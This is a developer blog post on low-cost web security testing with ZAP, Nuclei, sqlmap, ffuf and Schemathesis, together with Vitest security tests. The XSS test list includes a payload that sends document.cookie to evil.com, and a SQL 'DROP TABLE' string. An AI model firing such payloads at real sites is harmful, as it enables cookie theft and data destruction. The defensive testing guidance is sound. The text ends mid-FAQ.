---
title: "Security Testing on a Budget: Penetration Testing for Developers"
description: "A practical guide to security testing your web app without enterprise budgets. Free tools, CI integration, security-focused tests, and when to hire a pro."
date: 2026-02-12
lastModified: 2026-02-12
tags:
  - posts
  - security
  - engineering
  - testing
---

Professional penetration testing costs between $5,000 and $50,000 per engagement. For a startup or small team, that number often means the conversation ends before it starts. Security testing gets punted to "later," and later usually means after something breaks.

But here is the thing most security guides skip: you can cover 80% of what a professional pentest catches using free, open-source tools and security-focused tests you write yourself. The remaining 20%, the business logic flaws, the creative chaining of vulnerabilities, the stuff that requires a human adversary thinking creatively about your specific application, is where professional testers earn their fee. You should eventually hire them. But you should not wait until you can afford them to start testing.

This guide covers the full spectrum of budget security testing: automated scanners you can run tonight, security-focused tests you can write this week, fuzzing tools that find bugs humans miss, and a framework for deciding when free tools are enough and when it is time to bring in professionals.

## ZAP: Your Free Dynamic Application Security Scanner

ZAP (Zed Attack Proxy) is the most widely used open-source web application security scanner. Originally an OWASP project, ZAP is now maintained by Checkmarx, which hired all three project leads in September 2024 and committed to keeping ZAP free and open source under the Apache 2.0 license. The current version is 2.17.0, released in December 2025, with active monthly add-on updates.

ZAP is not a toy. It is a full-featured DAST (Dynamic Application Security Testing) tool that runs against your live application, crawls it, and throws attacks at every endpoint it finds.

### What ZAP Detects

ZAP runs both passive and active scans. Passive scanning watches traffic without modifying it, catching issues like missing security headers, information leakage, and insecure cookie configurations. Active scanning sends actual attack payloads to your application, testing for:

- **SQL injection** across multiple database types and injection techniques
- **Cross-site scripting (XSS)** including reflected, stored, and DOM-based variants
- **Remote OS command injection** via parameter manipulation
- **Server-side template injection (SSTI)** in templating engines
- **Path traversal** attempting to access files outside the web root
- **External redirects** that could be exploited for phishing
- **Cloud metadata attacks** targeting misconfigured cloud instances
- **Security misconfigurations** including verbose error messages, directory listings, and default credentials
- **Insecure deserialization** and components with known vulnerabilities

The active scan rule library covers hundreds of specific checks mapped to OWASP Top 10 categories. It will not catch logical flaws like broken access control or business logic vulnerabilities, because those require understanding your application's intent. But it will catch the injection and misconfiguration issues that make up the majority of exploitable web vulnerabilities.

### Running ZAP with Docker

The fastest way to scan your staging environment is with Docker. ZAP ships three official images: `stable`, `weekly` (latest features), and `bare` (minimal, for custom setups).

**Baseline scan** (passive only, safe for production-adjacent environments):

```bash
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://your-staging-url.com \
  -g gen.conf -r baseline-report.html
```

This runs the ZAP spider against your target for one minute (configurable with `-m`), waits for passive scanning to complete, and generates an HTML report. It does not send attack payloads, making it safe to run frequently.

**Full scan** (active attacks included, use only against staging):

```bash
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t https://your-staging-url.com \
  -r full-report.html
```

The full scan runs an unlimited spider, an optional AJAX spider, and then a complete active scan. Expect it to take 30 minutes to several hours depending on your application size.

### ZAP Automation Framework

For repeatable, configurable scans, ZAP's Automation Framework lets you define your entire scanning plan in a single YAML file:

```yaml
# zap-plan.yaml
env:
  contexts:
    - name: "My Application"
      urls:
        - "https://staging.yourapp.com"
      includePaths:
        - "https://staging.yourapp.com.*"
      excludePaths:
        - "https://staging.yourapp.com/logout.*"
  parameters:
    failOnError: true
    failOnWarning: false
    progressToStdout: true

jobs:
  - type: spider
    parameters:
      maxDuration: 5
      maxDepth: 10
  - type: spiderAjax
    parameters:
      maxDuration: 5
  - type: passiveScan-wait
    parameters:
      maxDuration: 10
  - type: activeScan
    parameters:
      maxRuleDurationInMins: 5
      maxScanDurationInMins: 30
  - type: report
    parameters:
      template: "traditional-html"
      reportDir: "/zap/wrk/"
      reportFile: "zap-report"
```

Run it with:

```bash
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable \
  zap.sh -cmd -autorun /zap/wrk/zap-plan.yaml
```

The YAML plan supports authentication configuration, session management, alert filters to suppress known false positives, and OpenAPI specification import for API scanning.

### ZAP in GitHub Actions

Here is a CI workflow that runs a ZAP baseline scan on every push and a full scan weekly:

```yaml
# .github/workflows/zap-scan.yml
name: ZAP Security Scan
on:
  push:
    branches: [main]
  schedule:
    - cron: '0 2 * * 0'  # Full scan every Sunday at 2am

jobs:
  baseline:
    runs-on: ubuntu-latest
    if: github.event_name == 'push'
    name: ZAP Baseline Scan
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.14.0
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          target: ${{ secrets.STAGING_URL }}
          rules_file_name: '.zap/rules.tsv'

  full-scan:
    runs-on: ubuntu-latest
    if: github.event_name == 'schedule'
    name: ZAP Full Scan
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: ZAP Full Scan
        uses: zaproxy/action-full-scan@v0.13.0
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          target: ${{ secrets.STAGING_URL }}
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'
```

The baseline scan is lightweight and runs in minutes. The full scan is thorough but aggressive, so schedule it outside business hours against a staging environment. Both automatically create GitHub issues for findings.

### False Positives: What to Expect

ZAP's false positive rate varies by vulnerability category. Research comparing versions 2.12.0 and 2.13.0 showed improved detection accuracy over time. In benchmarks, commercial tools like Invicti and Burp Suite Pro tend to produce fewer false positives, but ZAP outperforms several commercial alternatives including Qualys and Rapid7 InsightAppSec in detection rates.

In practice, expect to spend 15-30 minutes triaging results after your first scan. Create a `.zap/rules.tsv` file to suppress confirmed false positives so they do not clutter future runs. The Automation Framework's `alertFilter` job lets you handle this in your YAML plan as well.

## Burp Suite Community Edition: The Manual Testing Workhorse

Burp Suite Community Edition (current version: 2025.12.5) is the free tier of PortSwigger's industry-standard web security testing tool. Where ZAP excels at automated scanning, Burp Community shines at manual exploration.

### What You Get for Free

- **HTTP/HTTPS proxy** that intercepts and displays all traffic between your browser and the target application
- **Repeater** for manually replaying and modifying individual HTTP requests, testing one parameter at a time
- **Decoder** for encoding/decoding payloads (Base64, URL encoding, HTML entities)
- **Sequencer** for analyzing the randomness quality of session tokens
- **Comparer** for diffing responses side-by-side
- **Intruder** in demo mode (rate-limited but functional for small tests)
- **Extension support** via the BApp Store

### What Requires Professional ($475/year)

Burp Suite Professional adds the automated vulnerability scanner, full-speed Intruder for brute-force and fuzzing attacks, project files for saving work between sessions, Burp Collaborator for out-of-band testing (SSRF, blind XSS), content discovery, and pro-exclusive extensions. PortSwigger raised the price from $449 in 2024, and another increase is planned for 2026.

### When Community Edition Is Enough

Community Edition is sufficient when you are doing targeted manual testing of specific endpoints, when you need to understand how your application handles crafted inputs, or when you are verifying findings from automated scanners. It is the right tool for testing authentication flows, replaying requests with modified session tokens, and exploring how your API handles edge-case inputs.

If you find yourself spending significant time on repetitive testing that the Intruder could automate, or if you need the automated scanner for regular testing, Professional pays for itself quickly. But most developers doing security testing alongside feature work will find Community Edition covers their needs for manual exploration.

## Nuclei: Template-Based Scanning at Scale

Nuclei, built by ProjectDiscovery, takes a fundamentally different approach than ZAP. Instead of crawling your application and throwing generic attacks, Nuclei runs specific, targeted checks defined in YAML templates. It is MIT-licensed, completely free, and maintained by 220+ security researchers.

### How Nuclei Works

Nuclei does not crawl. You give it a target, and it runs its template library against it. Each template defines a specific check: an HTTP request pattern, the expected response, and what a match means. This design means near-zero false positives, because each template checks for a specific, known condition.

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Scan a target with all templates
nuclei -u https://your-staging-url.com

# Scan with specific template tags
nuclei -u https://your-staging-url.com -tags cve,owasp

# Scan with severity filter
nuclei -u https://your-staging-url.com -severity critical,high
```

### The Template Library

Nuclei ships with over 9,500 community templates covering CVEs, misconfigurations, default credentials, exposed panels, technology detection, and more. New CVE templates often appear within hours of public disclosure. In 2025 alone, hundreds of templates were added monthly, including 243 during Hacktoberfest and 197 in November covering 83 CVEs.

Templates support multiple protocols: HTTP, DNS, TCP, SSL, and WebSocket. You can also generate templates from natural-language descriptions using the `-ai` flag.

### How Nuclei Complements ZAP

ZAP and Nuclei are not competitors. They cover different ground:

| Capability | ZAP | Nuclei |
|---|---|---|
| Application crawling | Yes (spider + AJAX spider) | No |
| Generic injection testing | Yes (SQL, XSS, command injection) | Limited |
| Known CVE detection | Limited | Excellent (9,500+ templates) |
| Misconfiguration detection | Good | Excellent |
| False positive rate | Moderate | Near zero |
| Custom business logic | No | No |
| Speed | Slow (thorough) | Fast (targeted) |

Run ZAP for deep application testing. Run Nuclei for fast known-vulnerability sweeps. Together, they cover more ground than either alone.

## sqlmap: Still the Standard for SQL Injection

sqlmap (current version: 1.10.2, February 2026) remains the definitive tool for SQL injection detection and exploitation. If you suspect a SQL injection vulnerability, sqlmap will confirm it, identify the injection type, fingerprint the database, and demonstrate exactly how far an attacker could go.

```bash
# Basic scan of a URL parameter
sqlmap -u "https://staging.yourapp.com/api/users?id=1" --batch

# Test with authentication
sqlmap -u "https://staging.yourapp.com/api/users?id=1" \
  --cookie="session=your-session-token" --batch

# Test POST parameters
sqlmap -u "https://staging.yourapp.com/api/search" \
  --data="query=test" --batch
```

A 2024 study in the International Journal of Innovative Science and Advanced Engineering found sqlmap demonstrated superior performance in identifying boolean-based and time-based blind SQL injection vulnerabilities compared to other penetration testing tools.

If you are using an ORM with parameterized queries (and you should be, as covered in the [security-first development guide](/blog/security-first-development-guide/)), sqlmap should find nothing. That is the point. Run it to confirm your defenses work.

## Writing Security-Focused Tests

Automated scanners catch generic vulnerabilities. They cannot test your specific business logic. That is where security-focused tests come in. These are tests you write alongside your regular test suite, targeting the security boundaries of your application.

### Authentication Bypass Tests

These tests verify that unauthenticated users cannot access protected resources and that authentication cannot be circumvented:

```typescript
// tests/security/auth-bypass.test.ts
import { describe, it, expect } from 'vitest';

const API_URL = process.env.TEST_API_URL || 'http://localhost:3000';

describe('Authentication Bypass Prevention', () => {
  const protectedEndpoints = [
    { method: 'GET', path: '/api/users/me' },
    { method: 'GET', path: '/api/admin/users' },
    { method: 'POST', path: '/api/settings' },
    { method: 'DELETE', path: '/api/users/123' },
    { method: 'GET', path: '/api/billing/invoices' },
  ];

  protectedEndpoints.forEach(({ method, path }) => {
    it(`should reject ${method} ${path} without authentication`, async () => {
      const response = await fetch(`${API_URL}${path}`, {
        method,
        headers: { 'Content-Type': 'application/json' },
      });
      expect(response.status).toBe(401);
      const body = await response.json();
      // Should not leak information about why auth failed
      expect(body).not.toHaveProperty('stack');
      expect(body).not.toHaveProperty('sql');
    });

    it(`should reject ${method} ${path} with an expired token`, async () => {
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' +
        'eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNjAwMDAwMDAwfQ.' +
        'invalid-signature';
      const response = await fetch(`${API_URL}${path}`, {
        method,
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${expiredToken}`,
        },
      });
      expect(response.status).toBe(401);
    });

    it(`should reject ${method} ${path} with a malformed token`, async () => {
      const malformedTokens = [
        'not-a-jwt',
        'Bearer ',
        'Bearer null',
        'Bearer undefined',
        'Bearer {"admin":true}',
      ];
      for (const token of malformedTokens) {
        const response = await fetch(`${API_URL}${path}`, {
          method,
          headers: {
            'Content-Type': 'application/json',
            'Authorization': token,
          },
        });
        expect(response.status).toBe(401);
      }
    });
  });
});
```

### IDOR (Insecure Direct Object Reference) Tests

IDOR is consistently one of the most exploited vulnerability classes. These tests verify that users can only access their own resources:

```typescript
// tests/security/idor.test.ts
import { describe, it, expect, beforeAll } from 'vitest';

const API_URL = process.env.TEST_API_URL || 'http://localhost:3000';

describe('IDOR Prevention', () => {
  let userAToken: string;
  let userBToken: string;
  let userAId: string;
  let userBId: string;

  beforeAll(async () => {
    // Create two test users and get their tokens
    const loginA = await fetch(`${API_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'usera@test.com',
        password: 'test-password-a',
      }),
    });
    const dataA = await loginA.json();
    userAToken = dataA.token;
    userAId = dataA.userId;

    const loginB = await fetch(`${API_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'userb@test.com',
        password: 'test-password-b',
      }),
    });
    const dataB = await loginB.json();
    userBToken = dataB.token;
    userBId = dataB.userId;
  });

  it('should not allow User A to access User B profile', async () => {
    const response = await fetch(`${API_URL}/api/users/${userBId}`, {
      headers: { 'Authorization': `Bearer ${userAToken}` },
    });
    expect(response.status).toBe(403);
  });

  it('should not allow User A to update User B settings', async () => {
    const response = await fetch(`${API_URL}/api/users/${userBId}/settings`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${userAToken}`,
      },
      body: JSON.stringify({ name: 'hacked' }),
    });
    expect(response.status).toBe(403);
  });

  it('should not allow User A to delete User B data', async () => {
    const response = await fetch(`${API_URL}/api/users/${userBId}`, {
      method: 'DELETE',
      headers: { 'Authorization': `Bearer ${userAToken}` },
    });
    expect(response.status).toBe(403);
  });

  it('should not enumerate user IDs via sequential access', async () => {
    const responses = await Promise.all(
      Array.from({ length: 10 }, (_, i) =>
        fetch(`${API_URL}/api/users/${i + 1}`, {
          headers: { 'Authorization': `Bearer ${userAToken}` },
        })
      )
    );
    const unauthorized = responses.filter(r => r.status === 403);
    // User A should only access their own resource
    expect(unauthorized.length).toBeGreaterThanOrEqual(9);
  });
});
```

### Rate Limiting Tests

These tests verify your rate limiting is actually working:

```typescript
// tests/security/rate-limiting.test.ts
import { describe, it, expect } from 'vitest';

const API_URL = process.env.TEST_API_URL || 'http://localhost:3000';

describe('Rate Limiting', () => {
  it('should rate limit login attempts', async () => {
    const attempts = 20;
    const responses: Response[] = [];

    for (let i = 0; i < attempts; i++) {
      const response = await fetch(`${API_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'test@example.com',
          password: `wrong-password-${i}`,
        }),
      });
      responses.push(response);
    }

    const rateLimited = responses.filter(r => r.status === 429);
    expect(rateLimited.length).toBeGreaterThan(0);

    // Verify rate limit headers are present
    const lastResponse = responses[responses.length - 1];
    const retryAfter = lastResponse.headers.get('Retry-After');
    expect(retryAfter).toBeTruthy();
  });

  it('should rate limit password reset requests', async () => {
    const attempts = 10;
    const responses: Response[] = [];

    for (let i = 0; i < attempts; i++) {
      const response = await fetch(`${API_URL}/api/auth/reset-password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'test@example.com' }),
      });
      responses.push(response);
    }

    const rateLimited = responses.filter(r => r.status === 429);
    expect(rateLimited.length).toBeGreaterThan(0);
  });

  it('should rate limit API endpoints per user', async () => {
    const token = await getTestUserToken();
    const attempts = 150;
    const responses: Response[] = [];

    for (let i = 0; i < attempts; i++) {
      const response = await fetch(`${API_URL}/api/data`, {
        headers: { 'Authorization': `Bearer ${token}` },
      });
      responses.push(response);
    }

    const rateLimited = responses.filter(r => r.status === 429);
    expect(rateLimited.length).toBeGreaterThan(0);
  });
});
```

### Input Validation and XSS Prevention Tests

```typescript
// tests/security/input-validation.test.ts
import { describe, it, expect, beforeAll } from 'vitest';

const API_URL = process.env.TEST_API_URL || 'http://localhost:3000';

describe('Input Validation and XSS Prevention', () => {
  let authToken: string;

  beforeAll(async () => {
    authToken = await getTestUserToken();
  });

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    '"><script>alert(document.cookie)</script>',
    "'; DROP TABLE users; --",
    '{{constructor.constructor("return this")()}}',
    '${7*7}',
    '<svg onload=alert("xss")>',
    'javascript:alert("xss")',
    '<iframe src="javascript:alert(`xss`)">',
    '"><img src=x onerror=fetch("https://evil.com/steal?c="+document.cookie)>',
  ];

  xssPayloads.forEach((payload) => {
    it(`should sanitize XSS payload in user input: ${payload.substring(0, 40)}...`, async () => {
      const response = await fetch(`${API_URL}/api/users/me`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${authToken}`,
        },
        body: JSON.stringify({ name: payload }),
      });

      if (response.ok) {
        const data = await response.json();
        // If accepted, the stored value must be sanitized
        expect(data.name).not.toContain('<script');
        expect(data.name).not.toContain('onerror=');
        expect(data.name).not.toContain('javascript:');
      } else {
        // Rejecting the input is also acceptable
        expect(response.status).toBe(400);
      }
    });
  });

  it('should set proper security headers to prevent XSS', async () => {
    const response = await fetch(`${API_URL}/api/users/me`, {
      headers: { 'Authorization': `Bearer ${authToken}` },
    });
    expect(response.headers.get('Content-Type')).toContain('application/json');
    expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
  });

  it('should reject excessively long input', async () => {
    const longString = 'A'.repeat(100_000);
    const response = await fetch(`${API_URL}/api/users/me`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${authToken}`,
      },
      body: JSON.stringify({ name: longString }),
    });
    expect([400, 413]).toContain(response.status);
  });
});
```

### CSRF Protection Tests

```typescript
// tests/security/csrf.test.ts
import { describe, it, expect } from 'vitest';

const API_URL = process.env.TEST_API_URL || 'http://localhost:3000';

describe('CSRF Protection', () => {
  it('should reject state-changing requests without CSRF token', async () => {
    const token = await getTestUserToken();
    const response = await fetch(`${API_URL}/api/settings`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`,
        // Deliberately omitting CSRF token
      },
      body: JSON.stringify({ theme: 'dark' }),
    });
    // Should reject or require CSRF token for cookie-based auth
    // For pure Bearer token APIs, CSRF is less relevant but
    // SameSite cookie attributes should still be verified
    expect(response.ok).toBe(true); // Bearer-only APIs are inherently CSRF-safe
  });

  it('should set SameSite attribute on session cookies', async () => {
    const response = await fetch(`${API_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'test@example.com',
        password: 'test-password',
      }),
    });
    const setCookie = response.headers.get('set-cookie');
    if (setCookie) {
      expect(setCookie.toLowerCase()).toMatch(/samesite=(strict|lax)/);
      expect(setCookie.toLowerCase()).toContain('httponly');
      expect(setCookie.toLowerCase()).toContain('secure');
    }
  });

  it('should reject requests with wrong Origin header', async () => {
    const token = await getTestUserToken();
    const response = await fetch(`${API_URL}/api/settings`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`,
        'Origin': 'https://evil-site.com',
      },
      body: JSON.stringify({ theme: 'dark' }),
    });
    // Server should validate Origin for sensitive operations
    // or rely on CORS policy to block cross-origin requests
  });
});
```

These security tests should live in your test suite and run in CI alongside your functional tests. They document your security boundaries and catch regressions immediately. A new endpoint added without authentication? The auth bypass tests fail. Rate limiting accidentally removed? The rate limiting tests catch it.

## Fuzzing: Finding Bugs Humans Miss

Fuzzing is the practice of throwing random, malformed, or unexpected inputs at your application to see what breaks. Where manual testing follows logical paths, fuzzing explores the edges. It finds crashes, memory leaks, and unexpected behaviors that structured testing overlooks.

### ffuf: Fast Web Fuzzing

ffuf (Fuzz Faster U Fool) is the standard tool for web application fuzzing. Written in Go, it is significantly faster than Python-based alternatives like wfuzz.

**Directory discovery:**

```bash
ffuf -u https://staging.yourapp.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -mc 200,301,302,403 \
  -o results.json -of json
```

**Parameter fuzzing:**

```bash
ffuf -u "https://staging.yourapp.com/api/search?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 \
  -H "Authorization: Bearer $TOKEN"
```

**IDOR fuzzing with numeric IDs:**

```bash
ffuf -u https://staging.yourapp.com/api/users/FUZZ \
  -w <(seq 1 10000) \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,301,302 \
  -rate 50
```

The `-rate` flag throttles requests per second. Use it to avoid overwhelming your staging environment or triggering rate limiting you are not testing for.

### Schemathesis: API Fuzzing from Your OpenAPI Spec

If your API has an OpenAPI (Swagger) specification, Schemathesis generates test cases automatically from it. It finds crashes, 500 errors, and spec violations without you writing a single test:

```bash
# Install
pip install schemathesis

# Fuzz your API
schemathesis run https://staging.yourapp.com/openapi.json \
  --base-url https://staging.yourapp.com \
  --header "Authorization: Bearer $TOKEN" \
  --stateful=links
```

Schemathesis will generate thousands of requests with boundary values, missing fields, wrong types, extra-long strings, and Unicode edge cases. Every 500 response or spec violation is a potential bug. The `--stateful=links` flag makes it follow API links between resources, testing stateful workflows automatically.

### When Fuzzing Pays Off

Fuzzing is highest-value on endpoints that accept user input: search fields, file uploads, form submissions, API parameters, and anything that parses structured data (JSON, XML, CSV). If your application parses user-supplied files, fuzzing is not optional. It is the primary way to find parsing crashes and memory corruption bugs that lead to denial of service or worse.

## Bug Bounty Programs: Crowdsourced Testing

Bug bounty programs pay external security researchers to find vulnerabilities in your application. The concept is sound, but the economics matter.

### Platform Costs

- **HackerOne:** Starting around $20,000/year for platform access plus bounty payouts. The 1.5M+ researcher community is the largest, but the platform fee puts it out of reach for most startups
- **Bugcrowd:** Base subscriptions starting around $25,000-$50,000/year with managed triage options. Mid-market deployments with negotiated pricing can come in around $13,500
- **Intigriti and YesWeHack:** More budget-friendly alternatives, often more accessible for EU-focused or smaller programs

These numbers are before bounty payouts. A meaningful bug bounty budget typically starts at $500-$1,000 per valid finding for a web application, with critical vulnerabilities commanding $5,000-$15,000 or more depending on impact.

### When Bug Bounties Make Sense

Bug bounties are not a substitute for security testing. They are a supplement. The researchers only test what they can see, and they are incentivized to find the easiest bugs first. A bug bounty program on an application that has not been through basic automated scanning will generate a flood of low-hanging findings that you should have caught yourself, and you will pay bounty fees for each one.

Bug bounties make sense when you have already done the basics, your automated scanning is running, your security tests are passing, and you want external eyes finding the business logic flaws and creative attack chains that automated tools miss.

### The Free Alternative: security.txt and Responsible Disclosure

If a managed bug bounty platform is out of budget, set up a responsible disclosure program instead. It costs nothing and gives security researchers a way to report vulnerabilities:

1. Create a `/.well-known/security.txt` file per RFC 9116:

```text
Contact: mailto:security@yourcompany.com
Expires: 2027-02-12T00:00:00.000Z
Preferred-Languages: en
Canonical: https://yourcompany.com/.well-known/security.txt
Policy: https://yourcompany.com/security-policy
```

2. Create a security policy page at `/security-policy` that includes:
   - What constitutes a vulnerability report
   - What is in scope and out of scope
   - Your expected response timeline (aim for 48 hours acknowledgment)
   - Safe harbor language stating you will not pursue legal action against good-faith researchers
   - How you handle disclosure (coordinated disclosure with a 90-day timeline is standard)

This will not generate the volume of reports a paid program does, but it gives responsible researchers a way to contact you. Many of the most impactful vulnerability disclosures come through exactly this kind of program.

## Professional Penetration Testing: When and How to Hire

At some point, free tools are not enough. Professional penetration testers bring human creativity, years of experience finding business logic flaws, and the ability to chain vulnerabilities in ways automated scanners cannot.

### What It Costs

Penetration testing pricing in 2026 ranges widely based on scope and complexity:

| Test Type | Typical Range | Average |
|---|---|---|
| External network pentest | $5,000 - $20,000 | $10,000 |
| Web application pentest | $5,000 - $50,000 | $15,000 - $25,000 |
| Internal network (small) | $7,500 - $12,000 | $10,000 |
| Mobile application | $5,000 - $40,000 | $15,000 |
| API-only assessment | $5,000 - $20,000 | $10,000 |

Factors that drive cost up: application complexity, number of roles and authentication states, number of API endpoints, geographic location of the firm (U.S.-based testers charge $250-$500/hour versus $100-$200 in Eastern Europe), and certification requirements of the testers.

### When to Hire vs. DIY

**DIY is sufficient when:**
- You are testing for known vulnerability classes (injection, XSS, misconfigurations)
- Your application is relatively straightforward (CRUD operations, standard auth flows)
- You have developers who understand security testing basics
- Budget is under $5,000

**Hire a professional when:**
- You are handling sensitive data (financial, health, PII) and need a third-party assessment
- Your application has complex business logic (multi-tenant access control, financial transactions, workflow engines)
- Compliance requires it (SOC 2, PCI DSS, HIPAA all benefit from external pentesting)
- You have never had a professional assessment done
- You are preparing for a funding round or enterprise sales where a pentest report builds buyer confidence

### What to Look for in a Pentest Firm

Selecting the right vendor matters more than selecting the cheapest one:

**Certifications:** Look for testers with OSCP, OSCE, OSWE, or GIAC certifications. These are hands-on, practical certifications that demonstrate real attack skills, not just theoretical knowledge. Prefer firms with full-time employees over those subcontracting to freelancers.

**Methodology:** The firm should use recognized methodologies like PTES, OWASP Testing Guide, or NIST SP 800-115, and combine automated tools with extensive manual testing. If a firm only runs automated scans and calls it a pentest, keep looking.

**Reporting quality:** Ask for a sample report. It should include an executive summary with business risk context, detailed technical findings with proof-of-concept screenshots and reproduction steps, risk ratings per vulnerability, and actionable remediation recommendations. A report that is just a list of CVEs with no context is worth very little.

**Rules of engagement:** A professional firm will have a clear scoping process that documents target scope, testing schedule, escalation procedures, and out-of-scope areas before testing begins.

**Post-test support:** Good firms include remediation verification. After you fix the findings, they retest to confirm the fixes work. This should be included in the engagement, not an expensive add-on.

**Their own security posture:** Ironically, many pentest firms lack their own security certifications. Ask if they are SOC 2 or ISO 27001 certified. They will have access to your staging environment and potentially sensitive data during the engagement.

## Security Testing Prioritization: What to Test First

You cannot test everything at once. Here is a risk-based framework for prioritizing your security testing efforts.

### Tier 1: Test Immediately (High likelihood, High impact)

- **Authentication endpoints:** Login, registration, password reset, MFA enrollment. A flaw here compromises every user
- **Authorization checks:** Can User A access User B's data? Can a regular user access admin functions? Test every role boundary
- **Payment and financial endpoints:** Any endpoint that touches money or billing data
- **Data export and API endpoints that return PII:** A misconfigured endpoint that dumps user data is a breach

### Tier 2: Test This Week (Moderate-High risk)

- **File upload endpoints:** Path traversal, unrestricted file types, oversized uploads
- **Search and filtering endpoints:** SQL injection and NoSQL injection vectors
- **User input fields that render in the browser:** XSS vectors in profile pages, comments, user-generated content
- **Third-party integrations:** Webhook endpoints, OAuth callbacks, API key handling

### Tier 3: Test This Month (Moderate risk)

- **Session management:** Token expiration, concurrent session limits, session fixation
- **Error handling:** Do error messages leak stack traces, database queries, or internal paths?
- **Rate limiting:** On all public endpoints, especially authentication and data export
- **Security headers:** CSP, HSTS, X-Frame-Options, X-Content-Type-Options

### Tier 4: Test This Quarter (Lower risk, still important)

- **Dependency vulnerabilities:** Run `npm audit`, Trivy, or Snyk against your dependency tree
- **Infrastructure configuration:** Cloud security groups, database access controls, secret rotation
- **Logging and monitoring:** Are you actually capturing the events you would need for incident response?
- **Backup and recovery:** Can you restore from backup? How long does it take?

## The Minimum Viable Security Testing Checklist

If you do nothing else, do this. Phased by effort so you can start today and build over time.

### Phase 1: Today (2-4 hours)

- [ ] Run ZAP baseline scan against your staging environment
- [ ] Run `npm audit` (or equivalent) and fix critical/high vulnerabilities
- [ ] Run Nuclei against your staging URL with default templates
- [ ] Verify all API endpoints require authentication (manually test 5 critical ones)
- [ ] Check that your application sets security headers (use securityheaders.com)

### Phase 2: This Week (1-2 days)

- [ ] Write authentication bypass tests for all protected endpoints
- [ ] Write IDOR tests for multi-user data access
- [ ] Set up ZAP Automation Framework YAML plan and integrate into CI
- [ ] Add rate limiting tests for login and password reset
- [ ] Run sqlmap against your parameterized endpoints to confirm defenses

### Phase 3: This Month (1-2 weeks)

- [ ] Write XSS prevention tests with a comprehensive payload list
- [ ] Set up Nuclei in CI with custom template filters
- [ ] Run ffuf for directory discovery and parameter fuzzing
- [ ] Set up Schemathesis for API fuzzing if you have an OpenAPI spec
- [ ] Create a `security.txt` file and responsible disclosure policy
- [ ] Configure ZAP full scans on a weekly schedule

### Phase 4: This Quarter

- [ ] Evaluate whether a professional pentest is warranted based on data sensitivity and compliance needs
- [ ] Review and expand security test coverage for new features
- [ ] Run a tabletop exercise: if a vulnerability were reported today, do you know who handles it and how?
- [ ] Document your security testing process for onboarding new developers

Every phase builds on the previous one. Phase 1 catches the most critical issues. Phase 2 establishes automated safety nets. Phase 3 deepens coverage. Phase 4 matures the program. By the time you reach Phase 4, you have covered more ground than many companies that spend six figures on security.

The tools described in this guide, every scanner, every framework, every test pattern, are free. The only cost is your time, and that time pays compound interest. Every vulnerability you catch before production is a breach that never happens, a customer notification you never have to send, and an incident response you never have to run. Start with Phase 1 today. The scanners are ready. Your staging environment is waiting.

For a deeper look at the tools mentioned here, check the [free security toolstack guide](/blog/free-security-toolstack/) for installation and configuration details, and the [OWASP Top 10 in practice guide](/blog/owasp-top-10-practice/) for the vulnerability classes these tools are designed to catch.

## Frequently Asked Questions

**Can free security tools really replace professional penetration testing?**
Free tools cover the majority of known vulnerability classes: injection flaws, XSS, misconfigurations, missing security headers, and known CVEs. What they cannot do is test business logic, chain multiple low-severity findings into a critical exploit, or think creatively about your specific application like a human adversary. Use free tools as your baseline and bring in professionals when you handle sensitive data, need compliance evidence, or have complex multi-tenant authorization logic.

**How often should I run security scans?**
Run ZAP baseline scans on every push to your main branch. They take minutes and catch regressions immediately. Run ZAP full scans weekly against staging. Run Nuclei weekly or after template updates. Run your security-focused tests on every CI build, just like your unit tests. The goal is continuous coverage, not periodic audits.

**Which tool should I start with: ZAP or Nuclei?**
Start with ZAP. It crawls your application, discovers endpoints you might have forgotten about, and tests them for common vulnerability classes. Then add Nuclei for fast known-CVE detection and misconfiguration checks. ZAP gives breadth through application crawling. Nuclei gives depth on known issues with near-zero false positives. Together they cover significantly more than either alone.

**Is Burp Suite Community Edition worth using if ZAP is free?**
Yes, for manual testing. ZAP is stronger for automated scanning and CI integration. Burp Community is better for interactive manual testing: intercepting requests, modifying parameters by hand, analyzing session tokens, and exploring specific application behaviors one request at a time. Use ZAP for automation and Burp Community for manual exploration.

**How do I handle false positives from security scanners?**
